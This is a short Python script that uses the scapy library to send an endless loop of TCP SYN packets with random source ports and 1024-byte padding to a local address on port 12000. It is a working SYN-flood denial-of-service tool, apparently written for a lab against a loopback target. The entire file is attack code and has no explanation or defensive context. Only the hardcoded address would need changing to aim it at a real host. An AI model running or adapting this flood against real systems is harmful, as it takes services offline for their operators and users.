#! /usr/bin/env python3
from scapy.all import *

def main():
    serverName = '127.0.0.2'
    serverPort = 12000

    ip = IP(dst=serverName)
    tcp = TCP(sport=RandShort(), dport=serverPort, flags='S')
    raw = Raw(b'X'*1024)
    p = ip/tcp/raw
    send(p, loop=1, verbose=0)

if __name__ == "__main__":
    main()
